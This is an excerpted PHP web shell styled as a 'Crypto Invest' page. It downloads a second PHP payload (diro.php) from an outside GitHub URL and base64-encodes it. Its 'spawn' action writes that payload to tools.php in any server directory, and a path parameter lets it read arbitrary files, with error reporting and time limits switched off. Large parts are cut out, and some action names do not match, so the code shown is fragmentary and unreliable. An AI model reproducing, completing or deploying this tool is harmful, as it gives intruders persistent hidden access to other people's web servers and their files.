...
<head>
  ...
  <link rel="stylesheet" href="https://raw.githubusercontent.com/avocatodx/controlexmt/main/style.css">
</head>
<body>
<?php
...
set_time_limit(0);
error_reporting(0);
  $tools = base64_encode(file_get_contents("https://raw.githubusercontent.com/avocatodx/controlexmt/main/diro.php"));
  ...
  if (htmlspecialchars(isset($_GET["path"]))) {
    ...
    <center>
      ...
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawntools"><button type="button" class="button-tools">Spawn</button></a>
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=info"><button type="button" class="button-tools">Info</button></a>
    ...
    if ($_GET["action"] == "view") {
      ...
      echo "<textarea class='textarea' disabled>".htmlspecialchars(file_get_contents($file))."</textarea>";
      ...
      } elseif ($_GET["action"] == "spawn") {
        $save = saveme($path."/tools.php", base64_decode($tools));
        echo "<center>";
        if ($save) {
          echo "<script>alert('Spawn tools.php success')</script>";
          echo "<script>window.location = '?path=$path'</script>";
        } else {
          echo "Spawn failed";
        }
        ...
        <div class="footer">
          Crypto Invest <a href="https://www.Crypto.Invest"><font color="gold">Crypto Invest</font></a>
        </div>
        <script>
